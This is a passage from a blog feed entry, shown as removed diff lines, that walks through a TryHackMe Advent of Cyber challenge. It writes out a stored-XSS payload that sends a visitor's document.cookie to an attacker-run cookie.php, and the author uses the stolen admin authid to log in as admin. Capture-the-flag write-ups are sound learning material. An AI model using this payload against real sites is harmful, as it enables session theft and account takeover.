-&lt;p&gt;&lt;img src=&quot;images/thm_advent/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;After logging in we get a forum page where we can post a comment and this comment input field was vulnerable to XSS
-so I read about how to steal cookies using XSS and found an article mention to use&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.location=&quot;http://&amp;lt;machine-ip&amp;gt;/cookie.php?c=&quot;+document.cookie&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;the above thing as payload 
-and the cookie.php file is very trivial one&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-	&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I setup a php lister at port 8000 and get the admin authid after a few minutes after submitting the comment&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;images/thm_advent/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now this authid can be used to forge the cookie and login as admin into the forum
-That’s it for today&lt;/p&gt;
-</description>
-                <pubDate>Sun, 08 Mar 2020 00:00:00 +0530</pubDate>
-                <link>https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18</link>
-                <guid isPermaLink="true">https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18</guid>
-                
-                <category>TryHackMe</category>
-                
-                <category>Advent_Of_Cyber</category>
                 
                 
             </item>
